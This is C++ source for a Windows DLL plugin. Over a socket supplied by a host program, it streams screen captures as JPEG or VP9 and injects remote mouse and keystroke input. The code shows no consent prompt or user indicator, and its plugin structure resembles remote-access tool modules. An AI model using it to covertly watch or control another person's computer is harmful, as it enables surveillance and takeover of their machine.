#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include "../../include/json.hpp"
#include <setjmp.h>

#undef _setjmp
#undef _setjmpex

extern "C" int _setjmp(jmp_buf env, void* frame) {
    return __builtin_setjmp(env);
}

extern "C" int _setjmpex(jmp_buf env, void* frame) {
    return __builtin_setjmp(env);
}

// libvpx headers
#include "vpx/vpx_encoder.h"
#include "vpx/vp8cx.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

struct MonitorData {
    RECT rect{};
    string deviceName;
    string displayName;
    bool primary = false;
};

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_captureSocket = INVALID_SOCKET;
static int g_monitorIndex = 0;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static int g_format = 1; // 1 = JPEG, 4 = VP9
static RECT g_captureRect{};
static bool g_hasCaptureRect = false;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// VP9 Encoder states
static bool g_encoderInitialized = false;
static vpx_codec_ctx_t g_codec;
static vpx_image_t g_raw;
static vpx_codec_enc_cfg_t g_codec_cfg;
static int g_lastWidth = 0;
static int g_lastHeight = 0;
static int g_lastFormat = 0;
static int g_frameCount = 0;

static void cleanup_encoder() {
    if (g_encoderInitialized) {
        vpx_codec_destroy(&g_codec);
        vpx_img_free(&g_raw);
        g_encoderInitialized = false;
    }
    g_lastWidth = 0;
    g_lastHeight = 0;
    g_lastFormat = 0;
    g_frameCount = 0;
}

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_monitor_frame(SOCKET sock,
                                    int monitor,
                                    int scale,
                                    int fps,
                                    int width,
                                    int height,
                                    int format,
                                    const vector<unsigned char>& frameBytes) {
    if (frameBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = (uint32_t)max(0, monitor);
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)max(0, fps);
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = (uint32_t)format;
    frameHeader.dataSize = (uint32_t)frameBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + frameBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], frameBytes.data(), frameBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_monitor_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "monitorerror";
    response["error"] = message;
    safe_send_json(sock, response);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value || value[0] == L'\0')
        return "";

    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1)
        return "";

    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static string get_display_name(const char* deviceName) {
    if (!deviceName || deviceName[0] == '\0')
        return "";

    DISPLAY_DEVICEA displayDevice{};
    displayDevice.cb = sizeof(displayDevice);
    if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
        return string(displayDevice.DeviceString);

    return "";
}

static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
    vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);

    MONITORINFOEXA info{};
    info.cbSize = sizeof(info);
    if (!GetMonitorInfoA(monitor, &info))
        return TRUE;

    MonitorData item;
    item.rect = info.rcMonitor;
    item.deviceName = info.szDevice;
    item.displayName = get_display_name(info.szDevice);
    item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;

    if (item.displayName.empty())
        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;

    monitors->push_back(item);
    return TRUE;
}

static vector<MonitorData> enumerate_monitors() {
    vector<MonitorData> monitors;
    EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));

    if (monitors.empty()) {
        MonitorData fallback;
        fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        fallback.rect.top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        fallback.rect.right = fallback.rect.left + GetSystemMetrics(SM_CXVIRTUALSCREEN);
        fallback.rect.bottom = fallback.rect.top + GetSystemMetrics(SM_CYVIRTUALSCREEN);
        fallback.displayName = "Virtual Screen";
        fallback.primary = true;
        monitors.push_back(fallback);
    }

    return monitors;
}

static void send_monitor_list(SOCKET sock) {
    vector<MonitorData> monitors = enumerate_monitors();
    json response;
    response["action"] = "monitorlistresponse";
    response["monitors"] = json::array();

    for (size_t i = 0; i < monitors.size(); ++i) {
        const MonitorData& monitor = monitors[i];
        int width = monitor.rect.right - monitor.rect.left;
        int height = monitor.rect.bottom - monitor.rect.top;

        string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
        if (monitor.primary)
            name += " (Primary)";

        response["monitors"].push_back({
            {"index", (int)i},
            {"name", name},
            {"device", monitor.deviceName},
            {"left", monitor.rect.left},
            {"top", monitor.rect.top},
            {"width", width},
            {"height", height},
            {"primary", monitor.primary}
        });
    }

    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0;
    UINT size = 0;

    GetImageEncodersSize(&count, &size);
    if (size == 0)
        return -1;

    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok)
        return -1;

    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }

    return -1;
}

static DWORD now_ms() {
    return GetTickCount();
}

static int clamp_int(int value, int minValue, int maxValue) {
    return max(minValue, min(value, maxValue));
}

static int automatic_fps_for_scale(int scalePercent) {
    if (scalePercent >= 90) return 20;
    if (scalePercent >= 70) return 22;
    if (scalePercent >= 50) return 24;
    return 25;
}

static ULONG automatic_jpeg_quality(int width, int height, int scalePercent) {
    int pixels = max(1, width * height);

    if (scalePercent >= 90 || pixels >= 2500000) return 30;
    if (scalePercent >= 70 || pixels >= 1600000) return 36;
    if (scalePercent >= 50 || pixels >= 900000) return 44;
    return 52;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();

    if (!ensure_gdiplus()) {
        error = "GDI+ could not be started";
        return false;
    }

    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
        error = "JPEG encoder not found";
        return false;
    }

    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) {
        error = "Bitmap conversion failed";
        return false;
    }

    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
        error = "Memory stream could not be created";
        return false;
    }

    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;

    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) {
        stream->Release();
        error = "JPEG encoding failed";
        return false;
    }

    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
        stream->Release();
        error = "Encoded image size could not be read";
        return false;
    }

    if (stat.cbSize.QuadPart > 64LL * 1024LL * 1024LL) {
        stream->Release();
        error = "Encoded image is too large";
        return false;
    }

    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);

    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();

    if (readResult != S_OK || readBytes != bytes.size()) {
        error = "Encoded image could not be read";
        bytes.clear();
        return false;
    }

    return true;
}

static HBITMAP capture_screen_bitmap(const RECT& rect, int scalePercent, int& outputWidth, int& outputHeight, string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return NULL;
    }

    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
    outputHeight = max(1, (sourceHeight * scalePercent) / 100);

    // Make sure dimensions are even for YUV I420!
    if (outputWidth % 2 != 0) outputWidth++;
    if (outputHeight % 2 != 0) outputHeight++;

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return NULL;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        return NULL;
    }

    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
    if (!bitmap) {
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture bitmap could not be created";
        return NULL;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    if (!copied) {
        DeleteObject(bitmap);
        error = "Screen capture failed";
        return NULL;
    }

    return bitmap;
}

static bool capture_monitor_frame_jpeg(const RECT& rect,
                                       int scalePercent,
                                       vector<unsigned char>& jpegBytes,
                                       int& outputWidth,
                                       int& outputHeight,
                                       string& error) {
    cleanup_encoder();
    g_lastFormat = 1;

    HBITMAP bitmap = capture_screen_bitmap(rect, scalePercent, outputWidth, outputHeight, error);
    if (!bitmap) return false;

    ULONG jpegQuality = automatic_jpeg_quality(outputWidth, outputHeight, scalePercent);
    bool encoded = bitmap_to_jpeg(bitmap, jpegQuality, jpegBytes, error);
    DeleteObject(bitmap);
    return encoded;
}

static bool get_bitmap_pixels(HBITMAP bitmap, int width, int height, vector<uint8_t>& pixels, string& error) {
    HDC hdc = GetDC(NULL);
    if (!hdc) {
        error = "Failed to get screen DC";
        return false;
    }

    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height; // Top-down DIB
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    pixels.resize((size_t)width * height * 4);

    int result = GetDIBits(hdc, bitmap, 0, height, pixels.data(), &bmi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    if (result == 0) {
        error = "GetDIBits failed";
        return false;
    }
    return true;
}

static void BGRX_to_I420_strided(const uint8_t* bgrx, int width, int height,
                                 uint8_t* dst_y, int stride_y,
                                 uint8_t* dst_u, int stride_u,
                                 uint8_t* dst_v, int stride_v) {
    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int bgrx_idx = (y * width + x) * 4;
            uint8_t b = bgrx[bgrx_idx];
            uint8_t g = bgrx[bgrx_idx + 1];
            uint8_t r = bgrx[bgrx_idx + 2];

            int Y = ((66 * r + 129 * g + 25 * b + 128) >> 8) + 16;
            dst_y[y * stride_y + x] = (uint8_t)max(0, min(255, Y));

            if ((y % 2 == 0) && (x % 2 == 0)) {
                int U = ((-38 * r - 74 * g + 112 * b + 128) >> 8) + 128;
                int V = ((112 * r - 94 * g - 18 * b + 128) >> 8) + 128;
                dst_u[(y / 2) * stride_u + (x / 2)] = (uint8_t)max(0, min(255, U));
                dst_v[(y / 2) * stride_v + (x / 2)] = (uint8_t)max(0, min(255, V));
            }
        }
    }
}

static bool capture_monitor_frame_vp9(const RECT& rect,
                                      int scalePercent,
                                      vector<unsigned char>& vp9Bytes,
                                      int& outputWidth,
                                      int& outputHeight,
                                      string& error) {
    HBITMAP bitmap = capture_screen_bitmap(rect, scalePercent, outputWidth, outputHeight, error);
    if (!bitmap) return false;

    vector<uint8_t> bgrxPixels;
    if (!get_bitmap_pixels(bitmap, outputWidth, outputHeight, bgrxPixels, error)) {
        DeleteObject(bitmap);
        return false;
    }
    DeleteObject(bitmap);

    // Initialize or re-initialize encoder if needed
    if (!g_encoderInitialized || g_lastWidth != outputWidth || g_lastHeight != outputHeight || g_lastFormat != 4) {
        cleanup_encoder();

        vpx_codec_err_t res = vpx_codec_enc_config_default(vpx_codec_vp9_cx(), &g_codec_cfg, 0);
        if (res) {
            error = "Failed to get default VP9 config";
            return false;
        }

        g_codec_cfg.g_w = outputWidth;
        g_codec_cfg.g_h = outputHeight;
        g_codec_cfg.g_timebase.num = 1;
        g_codec_cfg.g_timebase.den = 30; // target fps
        g_codec_cfg.g_threads = 1;
        g_codec_cfg.g_lag_in_frames = 0;
        g_codec_cfg.rc_end_usage = VPX_CBR;
        g_codec_cfg.rc_target_bitrate = 1500; // kbps

        vpx_codec_err_t init_res = vpx_codec_enc_init(&g_codec, vpx_codec_vp9_cx(), &g_codec_cfg, 0);
        if (init_res != VPX_CODEC_OK) {
            error = string("Failed to initialize VP9: ") + vpx_codec_err_to_string(init_res);
            const char* detail = vpx_codec_error_detail(&g_codec);
            if (detail) {
                error += string(" - ") + detail;
            }
            return false;
        }

        vpx_codec_control(&g_codec, VP9E_SET_LOSSLESS, 0);
        vpx_codec_control(&g_codec, VP8E_SET_CPUUSED, 8); // fastest real-time mode

        if (!vpx_img_alloc(&g_raw, VPX_IMG_FMT_I420, outputWidth, outputHeight, 1)) {
            vpx_codec_destroy(&g_codec);
            error = "Failed to allocate VP9 raw image";
            return false;
        }

        g_encoderInitialized = true;
        g_lastWidth = outputWidth;
        g_lastHeight = outputHeight;
        g_lastFormat = 4;
        g_frameCount = 0;
    }

    // Convert BGRX to YUV I420 strided
    BGRX_to_I420_strided(bgrxPixels.data(), outputWidth, outputHeight,
                         g_raw.planes[VPX_PLANE_Y], g_raw.stride[VPX_PLANE_Y],
                         g_raw.planes[VPX_PLANE_U], g_raw.stride[VPX_PLANE_U],
                         g_raw.planes[VPX_PLANE_V], g_raw.stride[VPX_PLANE_V]);

    vp9Bytes.clear();
    int flags = 0;
    vpx_codec_err_t res = vpx_codec_encode(&g_codec, &g_raw, g_frameCount++, 1, flags, VPX_DL_REALTIME);
    if (res != VPX_CODEC_OK) {
        error = "VP9 encoding failed";
        return false;
    }

    vpx_codec_iter_t iter = NULL;
    const vpx_codec_cx_pkt_t *pkt = NULL;
    while ((pkt = vpx_codec_get_cx_data(&g_codec, &iter)) != NULL) {
        if (pkt->kind == VPX_CODEC_CX_FRAME_PKT) {
            size_t oldSize = vp9Bytes.size();
            vp9Bytes.resize(oldSize + pkt->data.frame.sz);
            memcpy(vp9Bytes.data() + oldSize, pkt->data.frame.buf, pkt->data.frame.sz);
        }
    }

    return !vp9Bytes.empty();
}

static void capture_loop() {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

    while (g_captureRunning.load()) {
        DWORD frameStart = now_ms();
        SOCKET sock = INVALID_SOCKET;
        int monitor = 0;
        int scale = 50;
        int targetFps = 20;
        int format = 1;
        RECT captureRect{};
        bool hasCaptureRect = false;

        {
            lock_guard<mutex> lock(g_captureMutex);
            sock = g_captureSocket;
            monitor = g_monitorIndex;
            scale = g_scalePercent;
            targetFps = g_targetFps;
            format = g_format;
            captureRect = g_captureRect;
            hasCaptureRect = g_hasCaptureRect;
        }

        if (!hasCaptureRect) {
            send_monitor_error(sock, "Capture monitor is not ready");
            g_captureRunning.store(false);
            break;
        }

        vector<unsigned char> frameBytes;
        int width = 0;
        int height = 0;
        string error;

        bool success = false;
        if (format == 4) {
            success = capture_monitor_frame_vp9(captureRect, scale, frameBytes, width, height, error);
        } else {
            success = capture_monitor_frame_jpeg(captureRect, scale, frameBytes, width, height, error);
        }

        if (success) {
            if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, format, frameBytes)) {
                g_captureRunning.store(false);
                break;
            }
        } else {
            send_monitor_error(sock, error.empty() ? "Capture failed" : error);
            g_captureRunning.store(false);
            break;
        }

        DWORD elapsed = now_ms() - frameStart;
        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);

        while (waitMs > 0 && g_captureRunning.load()) {
            DWORD chunk = min<DWORD>(waitMs, 20);
            Sleep(chunk);
            waitMs -= chunk;
        }
    }
}

static void stop_capture_thread() {
    g_captureRunning.store(false);

    if (g_captureThread.joinable()) {
        if (g_captureThread.get_id() == this_thread::get_id())
            g_captureThread.detach();
        else
            g_captureThread.join();
    }

    lock_guard<mutex> lock(g_captureMutex);
    g_hasCaptureRect = false;
    cleanup_encoder();
}

static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps, int format) {
    scalePercent = clamp_int(scalePercent, 10, 100);
    int targetFps = requestedFps > 0
        ? clamp_int(requestedFps, 20, 30)
        : automatic_fps_for_scale(scalePercent);

    vector<MonitorData> monitors = enumerate_monitors();
    if (monitors.empty()) {
        send_monitor_error(sock, "No monitors found");
        return;
    }

    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);

    {
        lock_guard<mutex> lock(g_captureMutex);
        g_captureSocket = sock;
        g_monitorIndex = safeMonitorIndex;
        g_scalePercent = scalePercent;
        g_targetFps = targetFps;
        g_format = format;
        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
        g_hasCaptureRect = true;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable())
            g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }

    json response;
    response["action"] = "monitorstatus";
    response["status"] = "started";
    response["monitor"] = safeMonitorIndex;
    response["scale"] = scalePercent;
    response["fps"] = targetFps;
    response["format"] = format;
    safe_send_json(sock, response);
}

static void simulate_mouse(const string& event, int button, int x, int y) {
    RECT rect{};
    {
        lock_guard<mutex> lock(g_captureMutex);
        if (!g_hasCaptureRect) return;
        rect = g_captureRect;
    }

    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);

    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (v_width <= 0 || v_height <= 0) return;

    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)fx;
    input.mi.dy = (LONG)fy;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    if (event == "move") {
        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
    } else if (event == "down") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
    } else if (event == "up") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

static void simulate_key(const string& event, int vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk;
    if (event == "up") {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_monitor_list(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "monitorlist") {
            send_monitor_list(sock);
            return;
        }

        if (action == "monitorstart") {
            int monitor = command.value("monitor", 0);
            int scale = command.value("scale", 50);
            int fps = command.value("fps", 0);
            int format = command.value("format", 1);
            start_capture(sock, monitor, scale, fps, format);
            return;
        }

        if (action == "monitorstop") {
            stop_capture_thread();

            json response;
            response["action"] = "monitorstatus";
            response["status"] = "stopped";
            safe_send_json(sock, response);
            return;
        }

        if (action == "mouseevent") {
            string event = command.value("event", "");
            int button = command.value("button", 0);
            int x = command.value("x", 0);
            int y = command.value("y", 0);
            simulate_mouse(event, button, x, y);
            return;
        }

        if (action == "keyevent") {
            string event = command.value("event", "");
            int vk = command.value("key", 0);
            simulate_key(event, vk);
            return;
        }

        send_monitor_error(sock, "Unknown monitoring action");
    } catch (const std::exception& e) {
        send_monitor_error(sock, string("Command parse failed: ") + e.what());
    } catch (...) {
        send_monitor_error(sock, "Command parse failed");
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning.store(false);
        cleanup_encoder();
        shutdown_gdiplus();
    }
    return TRUE;
}
